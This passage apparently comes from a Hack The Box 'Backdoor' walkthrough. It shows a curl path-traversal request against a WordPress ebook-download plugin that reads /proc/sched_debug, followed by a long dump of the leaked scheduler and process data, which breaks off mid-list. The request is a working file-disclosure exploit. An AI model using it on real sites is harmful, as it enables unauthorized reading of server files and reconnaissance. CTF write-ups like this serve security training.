529 530 531 532 533 534 535 536 537 538 539 540 541 542 543 544 545 546 547 548 549 550 551 552 553 554 555 556 557 558 559 560 561 562 563 564 565 566 567 568 569 570 571 572 573 574 π ~/htb/backdoor ❯ curl -s \u0026#34;10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../..//proc/sched_debug\u0026#34; ../../../../../../..//proc/sched_debug../../../../../../..//proc/sched_debug../../../../../../..//proc/sched_debugSched Debug Version: v0.11, 5.4.0-80-generic #90-Ubuntu ktime : 3887966.407279 sched_clk : 3888584.275900 cpu_clk : 3888056.881740 jiffies : 4295864257 sched_clock_stable() : 1 sysctl_sched .sysctl_sched_latency : 12.000000 .sysctl_sched_min_granularity : 1.500000 .sysctl_sched_wakeup_granularity : 2.000000 .sysctl_sched_child_runs_first : 0 .sysctl_sched_features : 2059067 .sysctl_sched_tunable_scaling : 1 (logarithmic) cpu#0, 2000.000 MHz .nr_running : 0 .nr_switches : 557787 .nr_load_updates : 0 .nr_uninterruptible : 2 .next_balance : 4295.864258 .curr-\u0026gt;pid : 0 .clock : 3888055.451240 .clock_task : 3888055.451240 .avg_idle : 1000000 .max_idle_balance_cost : 500000 cfs_rq[0]:/autogroup-82 .exec_clock : 0.000000 .MIN_vruntime : 0.000001 .min_vruntime : 775.934870 .max_vruntime : 0.000001 .spread : 0.000000 .spread0 : -14923.580373 .nr_spread_over : 0 .nr_running : 0 .load : 0 .runnable_weight : 0 .load_avg : 0 .runnable_load_avg : 0 .util_avg : 0 .util_est_enqueued : 0 .removed.load_avg : 0 .removed.util_avg : 0 .removed.runnable_sum : 0 .tg_load_avg_contrib : 0 .tg_load_avg : 4 .throttled : 0 .throttle_count : 0 .se-\u0026gt;exec_start : 3887928.649480 .se-\u0026gt;vruntime : 15693.626750 .se-\u0026gt;sum_exec_runtime : 2563.378530 .se-\u0026gt;load.weight : 2 .se-\u0026gt;runnable_weight : 2 .se-\u0026gt;avg.load_avg : 0 .se-\u0026gt;avg.util_avg : 0 .se-\u0026gt;avg.runnable_load_avg : 0 cfs_rq[0]:/autogroup-78 .exec_clock : 0.000000 .MIN_vruntime : 0.000001 .min_vruntime : 761.651623 .max_vruntime : 0.000001 .spread : 0.000000 .spread0 : -14937.863620 .nr_spread_over : 0 .nr_running : 0 .load : 0 .runnable_weight : 0 .load_avg : 0 .runnable_load_avg : 0 .util_avg : 0 .util_est_enqueued : 0 .removed.load_avg : 0 .removed.util_avg : 0 .removed.runnable_sum : 0 .tg_load_avg_contrib : 0 .tg_load_avg : 0 .throttled : 0 .throttle_count : 0 .se-\u0026gt;exec_start : 3887655.471120 .se-\u0026gt;vruntime : 15693.532393 .se-\u0026gt;sum_exec_runtime : 1016.615180 .se-\u0026gt;load.weight : 2 .se-\u0026gt;runnable_weight : 2 .se-\u0026gt;avg.load_avg : 0 .se-\u0026gt;avg.util_avg : 0 .se-\u0026gt;avg.runnable_load_avg : 0 cfs_rq[0]:/autogroup-36 .exec_clock : 0.000000 .MIN_vruntime : 0.000001 .min_vruntime : 1046.948344 .max_vruntime : 0.000001 .spread : 0.000000 .spread0 : -14652.566899 .nr_spread_over : 0 .nr_running : 0 .load : 0 .runnable_weight : 0 .load_avg : 0 .runnable_load_avg : 0 .util_avg : 0 .util_est_enqueued : 0 .removed.load_avg : 0 .removed.util_avg : 0 .removed.runnable_sum : 0 .tg_load_avg_contrib : 0 .tg_load_avg : 0 .throttled : 0 .throttle_count : 0 .se-\u0026gt;exec_start : 3887803.723600 .se-\u0026gt;vruntime : 15693.548413 .se-\u0026gt;sum_exec_runtime : 1015.887610 .se-\u0026gt;load.weight : 2 .se-\u0026gt;runnable_weight : 2 .se-\u0026gt;avg.load_avg : 0 .se-\u0026gt;avg.util_avg : 0 .se-\u0026gt;avg.runnable_load_avg : 0 cfs_rq[0]:/ .exec_clock : 0.000000 .MIN_vruntime : 0.000001 .min_vruntime : 15699.515243 .max_vruntime : 0.000001 .spread : 0.000000 .spread0 : 0.000000 .nr_spread_over : 0 .nr_running : 0 .load : 0 .runnable_weight : 0 .load_avg : 1 .runnable_load_avg : 0 .util_avg : 1 .util_est_enqueued : 0 .removed.load_avg : 0 .removed.util_avg : 0 .removed.runnable_sum : 0 .tg_load_avg_contrib : 0 .tg_load_avg : 0 .throttled : 0 .throttle_count : 0 rt_rq[0]: .rt_nr_running : 0 .rt_nr_migratory : 0 .rt_throttled : 0 .rt_time : 0.033390 .rt_runtime : 950.000000 dl_rq[0]: .dl_nr_running : 0 .dl_nr_migratory : 0 .dl_bw-\u0026gt;bw : 996147 .dl_bw-\u0026gt;total_bw : 0 runnable tasks: S task PID tree-key switches prio wait-time sum-exec sum-sleep ----------------------------------------------------------------------------------------------------------- I rcu_gp 3 13.968173 2 100 0.000000 0.003890 0.000000 0 0 / I rcu_par_gp 4 15.968234 2 100 0.000000 0.002150 0.000000 0 0 / I kworker/0:0H 6 2934.228300 4 100 0.000000 0.022430 0.000000 0 0 / I mm_percpu_wq 9 22.038051 2 100 0.000000 0.000710 0.000000 0 0 / S ksoftirqd/0 10 15693.524383 799 120 0.000000 29.860830 0.000000 0 0 / I rcu_sched 11 15693.777743 91101 120 0.000000 961.631970 0.000000 0 0 / S migration/0 12 28.038048 1112 0 0.000000 15.792810 0.000000 0 0 / S idle_inject/0 13 0.000000 3 49 0.000000 0.000000 0.000000 0 0 / S cpuhp/0 14 7094.775365 9 120 0.000000 0.061800 0.000000 0 0 / I blkcg_punt_bio 80 56.716856 2 100 0.000000 0.004470 0.000000 0 0 / S watchdogd 87 0.000000 2 0 0.000000 0.002610 0.000000 0 0 / Secryptfs-kthrea 91 666.202515 2 120 0.000000 0.002420 0.000000 0 0 / S irq/24-pciehp 94 0.000000 2 49 0.000000 0.004730 0.000000 0 0 / S irq/26-pciehp 96 0.000000 2 49 0.000000 0.003460 0.000000 0 0 / S irq/28-pciehp 98 0.000000 2 49 0.000000 0.003600 0.000000 0 0 / S irq/30-pciehp 100 0.000000 2 49 0.000000 0.005110 0.000000 0 0 / S irq/32-pciehp 102 0.000000 2 49 0.000000 0.003470 0.000000 0 0 / S irq/34-pciehp 104 0.000000 2 49 0.000000 0.003370 0.000000 0 0 / S irq/36-pciehp 106 0.000000 2 49 0.000000 0.003380 0.000000 0 0 / S irq/38-pciehp 108 0.000000 2 49 0.000000 0.003410 0.000000 0 0 / S irq/40-pciehp 110 0.000000 2 49 0.000000 0.003440 0.000000 0 0 / S irq/42-pciehp 112 0.000000 2 49 0.000000 0.003390 0.000000 0 0 / S irq/44-pciehp 114 0.000000 2 49 0.000000 0.004310 0.000000 0 0 / S irq/46-pciehp 116 0.000000 2 49 0.000000 0.003310 0.000000 0 0 / S irq/48-pciehp 118 0.000000 2 49 0.000000 0.003810 0.000000 0 0 / S irq/50-pciehp 120 0.000000 2 49 0.000000 0.003330 0.000000 0 0 / S irq/52-pciehp 122 0.000000 2 49 0.000000 0.003260 0.000000 0 0 / S irq/54-pciehp 124 0.000000 2 49 0.000000 0.003390 0.000000 0 0 / Iacpi_thermal_pm 126 861.158414 2 100 0.000000 0.003830 0.000000 0 0 / Ivfio-irqfd-clea 132 873.201845 2 100 0.000000 0.005030 0.000000 0 0 / I ipv6_addrconf 134 896.342308 2 100 0.000000 0.013510 0.000000 0 0 / I kworker/u257:0 146 946.497381 2 100 0.000000 0.013970 0.000000 0 0 / I mpt/0 199 1208.826430 2 100 0.000000 0.008660 0.000000 0 0 / S scsi_eh_2 200 2905.962107 26 120 0.000000 1.031890 0.000000 0 0 / S scsi_eh_3 202 2905.915477 26 120 0.000000 0.939060 0.000000 0 0 / S scsi_eh_4 204 2905.522677 26 120 0.000000 0.502340 0.000000 0 0 / I scsi_tmf_4 205 2675.852160 2 100 0.000000 0.008050 0.000000 0 0 / S irq/16-vmwgfx 207 -1.220909 16491 49 0.000000 306.173480 0.000000 0 0 / S scsi_eh_6 209 2905.911647 26 120 0.000000 0.882070 0.000000 0 0 / S scsi_eh_9 215 2906.006077 26 120 0.000000 0.969400 0.000000 0 0 / S scsi_eh_12 221 2905.989167 26 120 0.000000 0.966980 0.000000 0 0 / S scsi_eh_13 223 2905.952757 26 120 0.000000 0.966650 0.000000 0 0 / S scsi_eh_14 225 2905.543747 26 120 0.000000 0.584700 0.000000 0 0 / S scsi_eh_16 229 2905.983067 26 120 0.000000 0.935600 0.000000 0 0 / S scsi_eh_17 231 2905.484637 26 120 0.000000 0.453000 0.000000 0 0 / S scsi_eh_18 233 2905.968287 26 120 0.000000 0.947200 0.000000 0 0 / S scsi_eh_20 237 2905.912647 26 120 0.000000 0.876900 0.000000 0 0 / I scsi_tmf_22 244 2694.586770 2 100 0.000000 0.009500 0.000000 0 0 / I scsi_tmf_24 263 2726.773872 2 100 0.000000 0.008310 0.000000 0 0 / S scsi_eh_25 266 2905.522407 27 120 0.000000 0.506610 0.000000 0 0 / S scsi_eh_26 270 2905.933967 26 120 0.000000 0.923450 0.000000 0 0 / I scsi_tmf_26 272 2768.968135 2 100 0.000000 0.010760 0.000000 0 0 / I scsi_tmf_27 276 2794.205470 2 100 0.000000 0.008530 0.000000 0 0 / S scsi_eh_29 288 2905.910277 26 120 0.000000 0.895920 0.000000 0 0 / I scsi_tmf_29 289 2854.639701 2 100 0.000000 0.008110 0.000000 0 0 / S scsi_eh_30 292 2906.062467 26 120 0.000000 1.050620 0.000000 0 0 / S scsi_eh_31 294 2905.815461 26 120 0.000000 0.566150 0.000000 0 0 / I scsi_tmf_31 295 2865.658711 2 100 0.000000 0.007290 0.000000 0 0 / I scsi_tmf_32 326 2917.033447 2 100 0.000000 0.007910 0.000000 0 0 / I kworker/0:1H 327 15666.827258 2926 100 0.000000 47.482700 0.000000 0 0 / I kdmflush 340 2968.544087 2 100 0.000000 0.014870 0.000000 0 0 / I raid5wq 373 3079.091931 2 100 0.000000 0.013370 0.000000 0 0 / Iext4-rsv-conver 428 3291.327622 2 100 0.000000 0.014530 0.000000 0 0 / I kaluad 651 7130.355762 2 100 0.000000 0.006260 0.000000 0 0 / S multipathd 655 0.000000 4691 0 0.000000 94.699960 0.000000 0 0 /autogroup-24 S multipathd 657 0.000000 1 0 0.000000 0.259910 0.000000 0 0 /autogroup-24 S multipathd 658 0.000000 133 0 0.000000 4.411800 0.000000 0 0 /autogroup-24 Ssystemd-timesyn 679 120.995384 483 120 0.000000 132.502110 0.000000 0 0 /autogroup-31 S HangDetector 752 1046.948344 4021 120 0.000000 92.978310 0.000000 0 0 /autogroup-36 Saccounts-daemon 749 549.031179 67 120 0.000000 10.378790 0.000000 0 0 /autogroup-38 S gmain 754 561.877519 3831 120 0.000000 165.605480 0.000000 0 0 /autogroup-38 S gdbus 889 549.516819 33 120 0.000000 2.167690 0.000000 0 0 /autogroup-38 S rsyslogd 771 56.351033 33 120 0.000000 4.958700 0.000000 0 0 /autogroup-44 S rs:main Q:Reg 843 65.896163 2230 120 0.000000 79.671530 0.000000 0 0 /autogroup-44 S sh 816 24293.837963 7913 120 0.000000 1218.288540 0.000000 0 0 /autogroup-56 S sshd 833 0.418626 8 120 0.000000 7.942470 0.000000 0 0 /autogroup-64 S screen 906 0.602336 10 120 0.000000 1.120710 0.000000 0 0 /autogroup-75 S bash 908 17.903144 52 120 0.000000 18.897880 0.000000 0 0 /autogroup-76 S agetty 913 -3.840396 10 120 0.000000 3.330180 0.000000 0 0 /autogroup-84 S systemd 917 54.346534 179 120 0.000000 69.018000 0.000000 0 0 /autogroup-77 S (sd-pam) 925 3.705450 2 120 0.000000 0.136500 0.000000 0 0 /autogroup-77 S ib_io_ibuf 993 771.482680 7745 120 0.000000 69.874120 0.000000 0 0 /autogroup-82 S ib_io_log 994 771.476000 7745 120 0.000000 77.792220 0.000000 0 0 /autogroup-82 S ib_io_rd-1 995 771.482380 7748 120 0.000000 100.392780 0.000000 0 0 /autogroup-82 S ib_io_rd-2 996 771.471220 7745 120 0.000000 81.592840 0.000000 0 0 /autogroup-82 S ib_io_rd-3 997 771.483690 7748 120 0.000000 107.643540 0.000000 0 0 /autogroup-82 S ib_io_rd-4 998 771.469530 7745 120 0.000000 81.978890 0.000000 0 0 /autogroup-82 S ib_io_wr-3 1001 775.934870 7848 120 0.000000 155.501680 0.000000 0 0 /autogroup-82 S ib_io_wr-4 1002 775.954690 7824 120 0.000000 142.807080 0.000000 0 0 /autogroup-82 S ib_log_checkpt 1004 775.574210 3904 120 0.000000 118.354170 0.000000 0 0 /autogroup-82 S ib_srv_mon 1031 769.863310 775 120 0.000000 19.776670 0.000000 0 0 /autogroup-82 S ib_buf_resize 1032 153.389776 1 120 0.000000 0.028070 0.000000 0 0 /autogroup-82 S ib_srv_purge 1046 417.819490 1813 120 0.000000 30.218040 0.000000 0 0 /autogroup-82 S ib_srv_wkr-1 1047 417.464950 884 120 0.000000 28.941090 0.000000 0 0 /autogroup-82 S ib_srv_wkr-2 1048 415.492600 775 120 0.000000 25.314770 0.000000 0 0 /autogroup-82 S apache2 3160 709.965553 166 120 0.000000 38.611170 0.000000 0 0 /autogroup-78 S apache2 4996 691.601983 34 120 0.000000 11.022220 0.000000 0 0 /autogroup-78 S apache2 5005 694.699653 34 120 0.000000 10.280060 0.000000 0 0 /autogroup-78 S apache2 5020 757.435313 38 120 0.000000 10.067530 0.000000 0 0 /autogroup-78 I kworker/0:1 9067 15693.681043 6514 120 0.000000 178.078230 0.000000 0 0 / I kworker/0:2 9921 15262.821923 2 120 0.000000 0.013520 0.000000 0 0 / S su 9951 10.231050 22 120 0.000000 5.851000 0.000000 0 0 /autogroup-63 S bash 9959 0.058816 2 120 0.000000 1.272740 0.000000 0 0 /autogroup-97 S gdbserver 9960 5.262882 12 120 0.000000 1.577490 0.000000 0 0 /autogroup-97 cpu#1, 2000.000 MHz .nr_running : 1 .nr_switches : 542769 .nr_load_updates : 0 .nr_uninterruptible : -2 .next_balance : 4295.864258 .curr-\u0026gt;pid : 5001 .clock : 3888056.353640 .clock_task : 3888056.353640 .avg_idle : 1000000 .max_idle_balance_cost : 500000 cfs_rq[1]:/autogroup-82 .exec_clock : 0.000000 .MIN_vruntime : 0.000001 .min_vruntime : 2106.837584 .max_vruntime : 0.000001 .spread : 0.000000 .spread0 : -13592.677659 .nr_spread_over : 0 .nr_running : 0 .load : 0 .runnable_weight : 0 .load_avg : 4 .runnable_load_avg : 0 .util_avg : 1 .util_est_enqueued : 0 .removed.load_avg : 0 .removed.util_avg : 0 .removed.runnable_sum : 0 .tg_load_avg_contrib : 4 .tg_load_avg : 4 .throttled : 0 .throttle_count : 0 .se-\u0026gt;exec_start : 3888048.089570 .se-\u0026gt;vruntime : 20252.850533 .se-\u0026gt;sum_exec_runtime : 4045.453630 .se-\u0026gt;load.weight : 1048576 .se-\u0026gt;runnable_weight : 2 .se-\u0026gt;avg.load_avg : 2 .se-\u0026gt;avg.util_avg : 1 .se-\u0026gt;avg.runnable_load_avg : 0 cfs_rq[1]:/autogroup-36 .exec_clock : 0.000000 .MIN_vruntime : 0.000001 .min_vruntime : 2916.185737 .max_vruntime : 0.000001 .spread : 0.000000 .spread0 : -12783.329506 .nr_spread_over : 0 .nr_running : 0 .load : 0 .runnable_weight : 0 .load_avg : 0 .runnable_load_avg : 0 .util_avg : 0 .util_est_enqueued : 0 .removed.load_avg : 0 .removed.util_avg : 0 .removed.runnable_sum : 0 .tg_load_avg_contrib : 0 .tg_load_avg : 0 .throttled : 0 .throttle_count : 0 .se-\u0026gt;exec_start : 3888035.356290 .se-\u0026gt;vruntime : 20251.725401 .se-\u0026gt;sum_exec_runtime : 2903.749010 .se-\u0026gt;load.weight : 2 .se-\u0026gt;runnable_weight : 2 .se-\u0026gt;avg.load_avg : 0 .se-\u0026gt;avg.util_avg : 0 .se-\u0026gt;avg.runnable_load_avg : 0 cfs_rq[1]:/autogroup-78 .exec_clock : 0.000000 .MIN_vruntime : 0.000001 .min_vruntime : 498.994326 .max_vruntime : 0.000001 .spread : 0.000000 .spread0 : -15200.520917 .nr_spread_over : 0 .nr_running : 1 .load : 1048576 .runnable_weight : 1048576 .load_avg : 0 .runnable_load_avg : 0 .util_avg : 0 .util_est_enqueued : 0 .removed.load_avg : 0 .removed.util_avg : 0 .removed.runnable_sum : 0 .tg_load_avg_contrib : 0 .tg_load_avg : 0 .throttled : 0 .throttle_count : 0 .se-\u0026gt;exec_start : 3888056.353640 .se-\u0026gt;vruntime : 20251.242381 .se-\u0026gt;sum_exec_runtime : 1039.882000 .se-\u0026gt;load.weight : 1048576 .se-\u0026gt;runnable_weight : 1048576 .se-\u0026gt;avg.load_avg : 0 .se-\u0026gt;avg.util_avg : 0 .se-\u0026gt;avg.runnable_load_avg : 0 cfs_rq[1]:/ .exec_clock : 0.000000 .MIN_vruntime : 0.000001 .min_vruntime : 20257.185281 .max_vruntime : 0.000001 .spread : 0.000000 .spread0 : 4557.670038 .nr_spread_over : 0 .nr_running : 1 .load : 1048576 .runnable_weight : 1048576 .load_avg : 4 .runnable_load_avg : 0 .util_avg : 5 .util_est_enqueued : 11 .removed.load_avg : 0 .removed.util_avg : 0 .removed.runnable_sum : 0 .tg_load_avg_contrib : 0 .tg_load_avg : 0 .throttled : 0 .throttle_count : 0 rt_rq[1]: .rt_nr_running : 0 .rt_nr_migratory : 0 .rt_throttled : 0 .rt_time : 0.000000 .rt_runtime : 950.000000 dl_rq[1]: .dl_nr_running : 0 .dl_nr_migratory : 0 .dl_bw-\u0026gt;bw : 996147 .dl_bw-\u0026gt;total_bw : 0 runnable tasks: S task PID tree-key switches prio wait-time sum-exec sum-sleep ----------------------------------------------------------------------------------------------------------- S systemd 1 515.963755 3001 120 0.000000 1436.402490 0.000000 0 0 /autogroup-2 S kthreadd 2 19854.750146 289 120 0.000000 3.772400 0.000000 0 0 / S cpuhp/1 15 9619.140921 9 120 0.000000 0.131560 0.000000 0 0 / S idle_inject/1 16 -3.000000 3 49 0.000000 0.001350 0.000000 0 0 / S migration/1 17 0.000000 1091 0 0.000000 148.375764 0.000000 0 0 / S ksoftirqd/1 18 20251.198161 1038 120 0.000000 37.858230 0.000000 0 0 / I kworker/1:0H 20 4553.468099 5 100 0.000000 0.017200 0.000000 0 0 / S kdevtmpfs 21 9720.593273 188 120 0.000000 1.921670 0.000000 0 0 / I netns 22 2.951423 2 100 0.000000 0.000000 0.000000 0 0 / Srcu_tasks_kthre 23 2.951423 2 120 0.000000 0.000000 0.000000 0 0 / S kauditd 24 9690.553996 9 120 0.000000 0.118720 0.000000 0 0 / S khungtaskd 27 20234.026555 34 120 0.000000 6.054490 0.000000 0 0 / S oom_reaper 28 26.964921 2 120 0.000000 0.000000 0.000000 0 0 / I writeback 29 32.966058 2 100 0.000000 0.002100 0.000000 0 0 / S kcompactd0 30 38.968365 2 120 0.000000 0.002310 0.000000 0 0 / S ksmd 31 44.968362 2 125 0.000000 0.000000 0.000000 0 0 / S khugepaged 32 50.968359 2 139 0.000000 0.000000 0.000000 0 0 / I kintegrityd 78 326.968551 2 100 0.000000 0.000000 0.000000 0 0 / I kblockd 79 332.968548 2 100 0.000000 0.000000 0.000000 0 0 / I tpm_dev_wq 82 358.716306 2 100 0.000000 0.031320 0.000000 0 0 / I ata_sff 83 362.724055 2 100 0.000000 0.007750 0.000000 0 0 / I md 84 366.732684 2 100 0.000000 0.008630 0.000000 0 0 / I edac-poller 85 370.739303 2 100 0.000000 0.006620 0.000000 0 0 / I devfreq_wq 86 374.739302 2 100 0.000000 0.000000 0.000000 0 0 / S kswapd0 90 401.046925 3 120 0.000000 0.070100 0.000000 0 0 / I kthrotld 93 390.954901 2 100 0.000000 0.013470 0.000000 0 0 / S irq/25-pciehp 95 0.000000 3 49 0.000000 0.031150 0.000000 0 0 / S irq/27-pciehp 97 0.000000 3 49 0.000000 0.021510 0.000000 0 0 / S irq/29-pciehp 99 0.000000 3 49 0.000000 0.028840 0.000000 0 0 / S irq/31-pciehp 101 0.000000 3 49 0.000000 0.031140 0.000000 0 0 / S irq/33-pciehp 103 0.000000 3 49 0.000000 0.031390 0.000000 0 0 / S irq/35-pciehp 105 0.000000 3 49 0.000000 0.013310 0.000000 0 0 / S irq/37-pciehp 107 0.000000 3 49 0.000000 0.031890 0.000000 0 0 / S irq/39-pciehp 109 0.000000 3 49 0.000000 0.008530 0.000000 0 0 / S irq/41-pciehp 111 0.000000 3 49 0.000000 0.050030 0.000000 0 0 / S irq/43-pciehp 113 0.000000 3 49 0.000000 0.051050 0.000000 0 0 / S irq/45-pciehp 115 0.000000 3 49 0.000000 0.050270 0.000000 0 0 / S irq/47-pciehp 117 0.000000 3 49 0.000000 0.072440 0.000000 0 0 / S irq/49-pciehp 119 0.000000 3 49 0.000000 0.051010 0.000000 0 0 / S irq/51-pciehp 121 0.000000 3 49 0.000000 0.032410 0.000000 0 0 / S irq/53-pciehp 123 0.000000 3 49 0.000000 0.022460 0.000000 0 0 / S irq/55-pciehp 125 0.000000 3 49 0.000000 0.031860 0.000000 0 0 / S scsi_eh_0 127 472.147675 4 120 0.000000 10.972120 0.000000 0 0 / I scsi_tmf_0 128 398.998831 2 100 0.000000 0.022290 0.000000 0 0 / S scsi_eh_1 129 472.809105 4 120 0.000000 11.499780 0.000000 0 0 / I scsi_tmf_1 130 407.036405 2 100 0.000000 0.019230 0.000000 0 0 / I kstrp 143 432.652467 2 100 0.000000 0.005730 0.000000 0 0 / Icharger_manager 159 467.633525 2 100 0.000000 0.007620 0.000000 0 0 / I mpt_poll_0 198 914.433987 2 100 0.000000 0.099680 0.000000 0 0 / I scsi_tmf_2 201 3114.035121 2 100 0.000000 0.005700 0.000000 0 0 / I scsi_tmf_3 203 3128.384402 2 100 0.000000 0.005400 0.000000 0 0 / S scsi_eh_5 206 3467.476374 26 120 0.000000 1.451290 0.000000 0 0 / I scsi_tmf_5 208 3158.649153 2 100 0.000000 0.002970 0.000000 0 0 / I scsi_tmf_6 210 3166.650961 2 100 0.000000 0.002810 0.000000 0 0 / S scsi_eh_7 211 3466.911274 26 120 0.000000 0.836640 0.000000 0 0 / I scsi_tmf_7 212 3174.652726 2 100 0.000000 0.002290 0.000000 0 0 / S scsi_eh_8 213 3466.962144 26 120 0.000000 0.886470 0.000000 0 0 / I scsi_tmf_8 214 3182.654224 2 100 0.000000 0.002140 0.000000 0 0 / I scsi_tmf_9 216 3190.655821 2 100 0.000000 0.002140 0.000000 0 0 / S scsi_eh_10 217 3467.074194 26 120 0.000000 1.008860 0.000000 0 0 / I scsi_tmf_10 218 3198.657329 2 100 0.000000 0.002110 0.000000 0 0 / S scsi_eh_11 219 3466.967024 26 120 0.000000 0.901040 0.000000 0 0 / I scsi_tmf_11 220 3206.658897 2 100 0.000000 0.002130 0.000000 0 0 / I scsi_tmf_12 222 3214.660445 2 100 0.000000 0.002120 0.000000 0 0 / I scsi_tmf_13 224 3222.661942 2 100 0.000000 0.002040 0.000000 0 0 / I scsi_tmf_14 226 3230.663401 2 100 0.000000 0.002050 0.000000 0 0 / S scsi_eh_15 227 3467.015954 26 120 0.000000 0.996090 0.000000 0 0 / I scsi_tmf_15 228 3238.664819 2 100 0.000000 0.001960 0.000000 0 0 / I scsi_tmf_16 230 3246.666336 2 100 0.000000 0.002000 0.000000 0 0 / I scsi_tmf_17 232 3254.667794 2 100 0.000000 0.002000 0.000000 0 0 / I scsi_tmf_18 234 3262.669353 2 100 0.000000 0.002160 0.000000 0 0 / S scsi_eh_19 235 3466.967814 26 120 0.000000 0.936320 0.000000 0 0 / I scsi_tmf_19 236 3270.670931 2 100 0.000000 0.002170 0.000000 0 0 / I scsi_tmf_20 238 3278.672519 2 100 0.000000 0.002240 0.000000 0 0 / S scsi_eh_21 239 3467.008954 26 120 0.000000 0.930060 0.000000 0 0 / I scsi_tmf_21 240 3286.674600 2 100 0.000000 0.002950 0.000000 0 0 / S scsi_eh_22 241 3466.984654 26 120 0.000000 0.982770 0.000000 0 0 / I ttm_swap 242 3290.676642 2 100 0.000000 0.005410 0.000000 0 0 / I cryptd 243 3294.171350 2 100 0.000000 0.008490 0.000000 0 0 / S scsi_eh_23 250 3467.389594 26 120 0.000000 1.343560 0.000000 0 0 / I scsi_tmf_23 254 3307.976469 2 100 0.000000 0.009540 0.000000 0 0 / S scsi_eh_24 257 3466.983274 26 120 0.000000 0.940400 0.000000 0 0 / I scsi_tmf_25 268 3325.170472 2 100 0.000000 0.007550 0.000000 0 0 / S scsi_eh_27 274 3466.932984 26 120 0.000000 0.870440 0.000000 0 0 / S scsi_eh_28 278 3466.988974 26 120 0.000000 0.954740 0.000000 0 0 / I scsi_tmf_28 286 3360.887236 2 100 0.000000 0.009770 0.000000 0 0 / I scsi_tmf_30 293 3368.480111 2 100 0.000000 0.003280 0.000000 0 0 / S scsi_eh_32 325 3478.167941 2 120 0.000000 0.006600 0.000000 0 0 / I kworker/1:1H 334 20251.185475 4398 100 0.000000 666.837070 0.000000 0 0 / I kdmflush 342 4590.426086 2 100 0.000000 0.010790 0.000000 0 0 / S jbd2/dm-0-8 427 20251.354481 3868 120 0.000000 683.110790 0.000000 0 0 / Ssystemd-journal 485 364.094600 3805 119 0.000000 1035.144760 0.000000 0 0 /autogroup-3 S systemd-udevd 512 1579.887951 2094 120 0.000000 650.154970 0.000000 0 0 /autogroup-15 Ssystemd-network 528 22.064344 326 120 0.000000 64.087450 0.000000 0 0 /autogroup-17 I kmpath_rdacd 652 9654.587837 2 100 0.000000 0.009190 0.000000 0 0 / I kmpathd 653 9658.599931 2 100 0.000000 0.013460 0.000000 0 0 / Ikmpath_handlerd 654 9662.609687 2 100 0.000000 0.010420 0.000000 0 0 / S multipathd 656 0.000000 779 0 0.000000 24.616000 0.000000 0 0 /autogroup-24 S multipathd 659 0.000000 6115 0 0.000000 1344.361900 0.000000 0 0 /autogroup-24 S multipathd 660 0.000000 4 0 0.000000 3.713240 0.000000 0 0 /autogroup-24 S multipathd 661 0.000000 5 0 0.000000 0.215580 0.000000 0 0 /autogroup-24 S jbd2/sda2-8 663 16959.254078 17 120 0.000000 0.342370 0.000000 0 0 / Iext4-rsv-conver 664 9671.055457 2 100 0.000000 0.012670 0.000000 0 0 / Ssystemd-resolve 678 225.642944 970 120 0.000000 392.510760 0.000000 0 0 /autogroup-30 S sd-resolve 748 123.287787 1557 120 0.000000 167.656340 0.000000 0 0 /autogroup-31 S VGAuthService 688 11.177426 89 120 0.000000 12.465580 0.000000 0 0 /autogroup-35 S vmtoolsd 696 2916.185737 45131 120 0.000000 2840.781290 0.000000 0 0 /autogroup-36 S vmtoolsd 753 1197.191827 145 120 0.000000 1.027820 0.000000 0 0 /autogroup-36 S gmain 761 1197.192497 148 120 0.000000 1.354780 0.000000 0 0 /autogroup-36 S dbus-daemon 750 10.901464 395 120 0.000000 39.923820 0.000000 0 0 /autogroup-37 S irqbalance 763 171.113584 400 120 0.000000 736.259240 0.000000 0 0 /autogroup-41 S gmain 840 5.941204 1 120 0.000000 0.051770 0.000000 0 0 /autogroup-41 Snetworkd-dispat 770 24.195854 365 120 0.000000 86.311880 0.000000 0 0 /autogroup-42 S in:imuxsock 841 63.580682 1934 120 0.000000 82.897890 0.000000 0 0 /autogroup-44 S in:imklog 842 3.139038 5 120 0.000000 2.576600 0.000000 0 0 /autogroup-44 S systemd-logind 772 51.358314 351 120 0.000000 57.054520 0.000000 0 0 /autogroup-43 S cron 795 23.236217 84 120 0.000000 8.922890 0.000000 0 0 /autogroup-53 S cron 797 4.951889 22 120 0.000000 2.347230 0.000000 0 0 /autogroup-53 S cron 798 4.063958 28 120 0.000000 1.866590 0.000000 0 0 /autogroup-53 S sh 822 6.096762 3 120 0.000000 0.875700 0.000000 0 0 /autogroup-63 S atd 831 0.698262 5 120 0.000000 1.947490 0.000000 0 0 /autogroup-65 S apache2 919 498.994326 3952 120 0.000000 199.204200 0.000000 0 0 /autogroup-78 S polkitd 952 0.967613 45 120 0.000000 6.252250 0.000000 0 0 /autogroup-79 S gmain 957 0.219552 2 120 0.000000 0.054380 0.000000 0 0 /autogroup-79 S gdbus 959 2.391570 30 120 0.000000 2.256970 0.000000 0 0 /autogroup-79 S mysqld 982 1454.947024 201 120 0.000000 950.670570 0.000000 0 0 /autogroup-82 S ib_io_wr-1 999 2100.835614 7802 120 0.000000 141.530410 0.000000 0 0 /autogroup-82 S ib_io_wr-2 1000 2100.819574 7817 120 0.000000 98.355950 0.000000 0 0 /autogroup-82 S ib_pg_flush_co 1003 2100.851074 4025 120 0.000000 142.333740 0.000000 0 0 /autogroup-82 Sib_log_fl_notif 1005 2106.837584 39322 120 0.000000 730.203500 0.000000 0 0 /autogroup-82 S ib_log_flush 1006 2100.856484 39442 120 0.000000 511.413710 0.000000 0 0 /autogroup-82 Sib_log_wr_notif 1007 2100.843974 39318 120 0.000000 684.086800 0.000000 0 0 /autogroup-82 S ib_log_writer 1008 2100.847394 39350 120 0.000000 516.739660 0.000000 0 0 /autogroup-82 S ib_srv_lock_to 1029 2100.811394 3874 120 0.000000 82.384720 0.000000 0 0 /autogroup-82 S ib_srv_err_mon 1030 2100.798264 3873 120 0.000000 77.534820 0.000000 0 0 /autogroup-82 S ib_src_main 1033 2100.626584 3874 120 0.000000 259.413790 0.000000 0 0 /autogroup-82 S ib_dict_stats 1034 2100.175464 388 120 0.000000 10.692290 0.000000 0 0 /autogroup-82 S ib_fts_opt 1035 2100.178374 776 120 0.000000 22.133930 0.000000 0 0 /autogroup-82 S xpl_worker-1 1038 2093.646894 65 120 0.000000 1.523890 0.000000 0 0 /autogroup-82 S xpl_worker-2 1039 2093.665384 65 120 0.000000 0.924880 0.000000 0 0 /autogroup-82 S xpl_accept-1 1040 1256.510815 3 120 0.000000 0.024590 0.000000 0 0 /autogroup-82 S ib_buf_dump 1044 